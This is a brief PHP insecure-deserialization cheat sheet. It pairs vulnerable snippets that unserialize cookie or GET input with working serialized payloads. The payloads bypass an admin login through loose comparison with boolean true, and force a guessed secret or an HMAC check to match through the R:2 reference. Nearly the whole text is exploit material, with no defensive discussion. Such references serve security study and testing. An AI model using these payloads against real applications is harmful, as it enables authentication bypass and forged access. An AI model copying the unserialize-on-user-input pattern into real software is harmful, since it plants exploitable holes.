Vulnerable code:
<?php
$data = unserialize($_COOKIE['auth']);

if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
    $admin = true;
} else {
    $admin = false;
}

Payload (substitute bool true instead of strings - true == "str" is truthy):
a:2:{s:8:"username";b:1;s:8:"password";b:1;}

Vulnerable code:
<?php
class ObjectExample
{
  var $guess;
  var $secretCode;
}

$obj = unserialize($_GET['input']);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>

Payload (guess references R:2 to secretCode -> always equal):
O:13:"ObjectExample":2:{s:10:"secretCode";N;s:5:"guess";R:2;}

Likewise with an array:
a:2:{s:10:"admin_hash";N;s:4:"hmac";R:2;}

